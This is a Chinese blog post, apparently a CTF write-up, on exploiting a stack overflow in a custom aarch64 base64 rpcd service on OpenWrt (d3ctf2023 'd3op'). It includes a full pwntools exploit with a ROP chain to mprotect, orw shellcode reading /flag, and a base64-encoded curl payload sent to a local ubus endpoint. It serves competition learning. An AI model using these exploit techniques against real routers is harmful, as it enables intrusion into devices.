@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a2ur2.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="本题与可爱♂通e宝一起深入探讨交流">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【pwn】d3ctf2023-d3op">
+<meta property="og:url" content="https://a2ur2.github.io/2023/05/09/d3op/index.html">
+<meta property="og:site_name" content="A2ur2的梦想小屋">
+<meta property="og:description" content="本题与可爱♂通e宝一起深入探讨交流">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2023/05/09/p9BDsTU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/05/09/p9BD6kF.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/05/09/p9BDcY4.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/05/09/p9BDRp9.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/05/09/p9BDWlR.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/05/09/p9BDoTO.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/05/09/p9BDHte.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/05/09/p9BDLpd.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/05/09/p9BDX6I.md.png">
+<meta property="article:published_time" content="2023-05-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-05-09T13:27:16.263Z">
+<meta property="article:author" content="A2ur2">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2023/05/09/p9BDsTU.png">
+
+<link rel="canonical" href="https://a2ur2.github.io/2023/05/09/d3op/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【pwn】d3ctf2023-d3op | A2ur2的梦想小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">A2ur2的梦想小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我许下的愿望该向谁去说明</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2023/05/09/d3op/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="A2ur2">
+      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="A2ur2的梦想小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【pwn】d3ctf2023-d3op
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-05-09 00:00:00 / 修改时间：21:27:16" itemprop="dateCreated datePublished" datetime="2023-05-09T00:00:00+08:00">2023-05-09</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本题与可爱♂通e宝一起深入探讨交流</p>
+<span id="more"></span>
+<h1 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h1><h2 id="确认大致漏洞点"><a href="#确认大致漏洞点" class="headerlink" title="确认大致漏洞点"></a>确认大致漏洞点</h2><p>题目给出了一个openwrt的img，从官网中下载官方的文件系统</p>
+<p><a target="_blank" rel="noopener" href="https://downloads.openwrt.org/releases/22.03.3/targets/armvirt/64/">https://downloads.openwrt.org/releases/22.03.3/targets/armvirt/64/</a></p>
+<p>diff后发现，在rdp中多了一个base64的服务，d3op的文件系统比官网多了一个base64的elf，位于usr&#x2F;libexec&#x2F;rpcd，那么本题的漏洞点可以大致确定在base64这个elf中。</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9BDsTU"><img src="https://s1.ax1x.com/2023/05/09/p9BDsTU.png" alt="p9BDsTU.png"></a></p>
+<p>这个base64并不是直接去调用，而是在qemu中使用ubus去call这个应用程序间接调用。</p>
+<h2 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h2><h3 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h3><p>payload例子：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -S ubus call base64 encode &#x27;&#123;&quot;input&quot;:&quot;payload&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h3><p>payload例子：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -d &#x27;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;:&quot;call&quot;, &quot;id&quot;:1, &quot;params&quot;:[&quot;00000000000000000000000000000000&quot;,&quot;base64&quot;,&quot;decode&quot;,&#123;&quot;input&quot;:&quot;payload&quot;&#125;]  &#125;&#x27; http://localhost:9999/ubus</span><br></pre></td></tr></table></figure>
+
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>base64为aarch64架构，仅仅开启了nx保护，静态编译</p>
+<p>由于我们知道base64提供了encode和decode的功能，所以可以搜索字符串快速定位到main_fun函数。</p>
+<p>sub_40655c内容，主要在judge op后会判断走encode还是decode</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9BD6kF"><img src="https://s1.ax1x.com/2023/05/09/p9BD6kF.md.png" alt="p9BD6kF.md.png"></a></p>
+<p>在decode函数中，通过两个if判断来判断size是否可以继续解码写入数据到内存，其中存在v16数组越界，可以覆盖到下面的变量，从而造成溢出</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9BDcY4"><img src="https://s1.ax1x.com/2023/05/09/p9BDcY4.md.png" alt="p9BDcY4.md.png"></a></p>
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="如何劫持执行流"><a href="#如何劫持执行流" class="headerlink" title="如何劫持执行流"></a>如何劫持执行流</h2><p>由于可以栈溢出，并且在decode函数的最后汇编如下</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9BDRp9"><img src="https://s1.ax1x.com/2023/05/09/p9BDRp9.md.png" alt="p9BDRp9.md.png"></a></p>
+<p>汇编意义：</p>
+<p>LDR是将memory中的数载入到寄存器，LDR可以载入立即数。格式如下：<strong>LDR 目的寄存器，源</strong></p>
+<p>STR是将寄存器中的数字载入内存。格式如下：<strong>STR{条件} 源寄存器，&lt;存储器地址&gt;</strong></p>
+<p>可以看到最后是通过sp来对x29，x30寄存器进行赋值，最后ret。</p>
+<p>那么意味着我们栈溢出可以hijack掉这两个寄存器，并且由于aarch64架构下，函数返回地址是存放在x30，因此我们可以劫持执行流。</p>
+<h2 id="寻找可用的函数"><a href="#寻找可用的函数" class="headerlink" title="寻找可用的函数"></a>寻找可用的函数</h2><p>由于是静态编译，不难想到可以查找下该elf编译了什么库函数。</p>
+<p>通过搜索系统调用号，我们可以找到mprotect函数的位置</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9BDWlR"><img src="https://s1.ax1x.com/2023/05/09/p9BDWlR.md.png" alt="p9BDWlR.md.png"></a></p>
+<p>交叉引用下，发现只有两处调用mprotect函数时的第三个参数是7。</p>
+<p>最后锁定了这一处，因为这可以控制通过x0+padding的方式控制完所有需要的寄存器。</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9BDoTO"><img src="https://s1.ax1x.com/2023/05/09/p9BDoTO.md.png" alt="p9BDoTO.md.png"></a></p>
+<p>因此我们尝试寻找一个能控制x0的gadget，这样我们就能在一定偏移处布置到调用mprotect时的寄存器，于此同时，这个gadget也需要能够再做一次执行流的跳转，此外mprotect记得地址要000结尾（逃</p>
+<p>最后锁定下图的第四条gadget</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9BDHte"><img src="https://s1.ax1x.com/2023/05/09/p9BDHte.md.png" alt="p9BDHte.md.png"></a></p>
+<p>至此我们就可以愉快的使用shellcode，但真的就结束了吗（</p>
+<h2 id="如何愉快的带出flag"><a href="#如何愉快的带出flag" class="headerlink" title="如何愉快的带出flag"></a>如何愉快的带出flag</h2><p>在最后成功执行完orw后，我俩望着没有任何回显的shell发呆。</p>
+<p>是的，在这题里就算你能hijack掉执行流，也不会有flag回显，甚至任何输出都没有。</p>
+<p>因为是通过ubus call去调用的base64，然后我们hijack的是base64的执行流，base64打印flag与我ubus有何相关（bushi</p>
+<p>通过询问chatgpt</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9BDLpd"><img src="https://s1.ax1x.com/2023/05/09/p9BDLpd.md.png" alt="p9BDLpd.md.png"></a></p>
+<p>我们可以大致捋清楚该过程，即客户端（即我们）是通过发送请求来让另一个进程响应请求并且调用base64，所以最后base64进程结束后，ubus会解析判断这个进程的返回值，即output，我们hijack了base64后直接write flag，由于不符合ubus 的 json返回格式，所以不会被解析然后传到ubus返回到当前shell</p>
+<p>在最后，鼠鼠我尝试让执行流执行完read操作后，再跳回到原本的output，企图带出flag（但很显然失败的，失败的原因鼠鼠猜测是走到这里没办法正常的exit掉这个进程，然后客户端没有接收到这个进程exit的信号</p>
+<p>最后的最后，我们采用了自行伪造一个json，输出flag的时候带上{“output”:””}</p>
+<p>意思呢就是payload里本来就带有这么一个输出格式，执行shellcode的时候把flag写到这个格式里面，然后write这个一段，exit掉进程，ubus就会接收到这个进程exit，然后解析判断output，由于我们的output伪造成了一个正确的返回格式，于是就会将我们的flag愉快的带出来</p>
+<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.arch = <span class="string">&quot;aarch64&quot;</span></span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x4579a0</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x4a22bc</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x00000000004A22B0</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect(0x00000000004A2098,0x400,7)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00000000004579A0 FD 7B BF A9                   STP             X29, X30, [SP,#-0x10+var_s0]!</span></span><br><span class="line"><span class="string">.text:00000000004579A4 E2 00 80 52                   MOV             W2, #7</span></span><br><span class="line"><span class="string">.text:00000000004579A8 FD 03 00 91                   MOV             X29, SP</span></span><br><span class="line"><span class="string">.text:00000000004579AC 03 48 42 F9                   LDR             X3, [X0,#0x490]</span></span><br><span class="line"><span class="string">.text:00000000004579B0 01 4C 42 F9                   LDR             X1, [X0,#0x498]</span></span><br><span class="line"><span class="string">.text:00000000004579B4 00 50 42 F9                   LDR             X0, [X0,#0x4A0]</span></span><br><span class="line"><span class="string">.text:00000000004579B8 21 00 00 CB                   SUB             X1, X1, X0</span></span><br><span class="line"><span class="string">.text:00000000004579BC 60 00 00 8B                   ADD             X0, X3, X0</span></span><br><span class="line"><span class="string">.text:00000000004579C0 60 2E FF 97                   BL              mprotect</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">x0_x29_x30 = <span class="number">0x4494b8</span></span><br><span class="line">mprotect = <span class="number">0x4579a4</span></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x4a3000</span>)+p64(<span class="number">0x4a2000</span>) <span class="comment">#0x18</span></span><br><span class="line">payload += <span class="string">b&quot;&#123;\&quot;output\&quot;: \&quot;&quot;</span> <span class="comment">#0x4a22b0:    &quot;&#123;\&quot;output\&quot;: \&quot;&quot;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload += <span class="string">b&quot;\&quot;&#125;&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x418</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += <span class="string">b&quot;\x30\x06\x00\x00&quot;</span> + <span class="string">b&quot;\x1d\x04\x00\x00&quot;</span> + <span class="string">b&quot;\x84\x05\x00\x00&quot;</span> + <span class="string">b&quot;\x90\x04\x00\x00&quot;</span></span><br><span class="line">payload += p64(<span class="number">0x4a2098</span>) <span class="comment">#x29</span></span><br><span class="line">payload += p64(x0_x29_x30) <span class="comment">#x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x4A2098</span>) + p64(mprotect)   <span class="comment">#29 #30</span></span><br><span class="line">payload += p64(<span class="number">0x4A2298</span> - <span class="number">0x490</span>) <span class="comment">#x0 0x470</span></span><br><span class="line">payload += p64(<span class="number">0x4a2098</span>)*<span class="number">3</span></span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>最后打远程的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -d <span class="string">&#x27;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;:&quot;call&quot;, &quot;id&quot;:1, &quot;params&quot;:[&quot;00000000000000000000000000000000&quot;,&quot;base64&quot;,&quot;decode&quot;,&#123;&quot;input&quot;:&quot;7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oFXhNJBCaDyAiCA0ugHgNIBAADUIACA0gFWhNJBCaDyAiCA0ggIgNIBAADUIACA0qgLgNIBAADUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwSgAAAAAAACBKAAAAAAB7Im91dHB1dCI6ICJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSJ9AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAGAAAdBAAAhAUAAJAEAACYIEoAAAAAALiURAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACYIEoAAAAAAKR5RQAAAAAACB5KAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAAA=&quot;&#125;]  &#125;&#x27;</span> http://localhost:<span class="number">9999</span>/ubus</span><br></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9BDX6I"><img src="https://s1.ax1x.com/2023/05/09/p9BDX6I.md.png" alt="p9BDX6I.md.png"></a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/04/06/%E5%88%9D%E6%8E%A2arm/" rel="prev" title="arm-pwn">
+      <i class="fa fa-chevron-left"></i> arm-pwn
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">基本分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AE%E8%AE%A4%E5%A4%A7%E8%87%B4%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="nav-number">1.1.</span> <span class="nav-text">确认大致漏洞点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%A4%E4%BA%92"><span class="nav-number">1.2.</span> <span class="nav-text">交互</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">本地调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B"><span class="nav-number">1.2.2.</span> <span class="nav-text">远程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">逆向分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%8A%AB%E6%8C%81%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-number">2.1.</span> <span class="nav-text">如何劫持执行流</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%AF%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">2.2.</span> <span class="nav-text">寻找可用的函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%84%89%E5%BF%AB%E7%9A%84%E5%B8%A6%E5%87%BAflag"><span class="nav-number">2.3.</span> <span class="nav-text">如何愉快的带出flag</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exp"><span class="nav-number">3.</span> <span class="nav-text">Exp</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">A2ur2</p>
+  <div class="site-description" itemprop="description">在成为大赛pwn题签到员的路上</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">A2ur2</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
